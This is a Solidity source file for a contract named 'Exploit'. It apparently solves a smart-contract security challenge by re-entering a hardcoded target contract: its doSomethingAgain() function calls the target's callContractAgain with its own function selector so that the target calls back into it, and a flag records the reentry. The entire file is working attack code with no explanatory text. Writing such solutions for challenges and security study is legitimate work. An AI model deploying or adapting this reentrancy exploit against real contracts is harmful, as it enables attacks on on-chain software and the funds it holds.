// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Exploit {
    uint256 public s_variable = 0;
    bool private s_hasReentered = false;
    address private constant VULNERABLE_CONTRACT =
        0x241F77325C073a3815985691f76B58dff17F685B;
    address private i_owner;

    constructor() {
        i_owner = msg.sender;
    }

    function doSomething() external {
        s_variable = 123;
    }

    function doSomethingAgain() external returns (bool) {
        if (s_hasReentered) {
            return true;
        }

        s_hasReentered = true;
        (bool success, ) = VULNERABLE_CONTRACT.call(
            abi.encodeWithSignature(
                "callContractAgain(address,bytes4)",
                address(this),
                bytes4(keccak256("doSomethingAgain()"))
            )
        );

        return success;
    }

    function getSelector() external pure returns (bytes4) {
        return bytes4(keccak256("doSomethingAgain()"));
    }

    function getOwner() external view returns (address) {
        return i_owner;
    }

    function getHasReentered() public view returns (bool) {
        return s_hasReentered;
    }
}
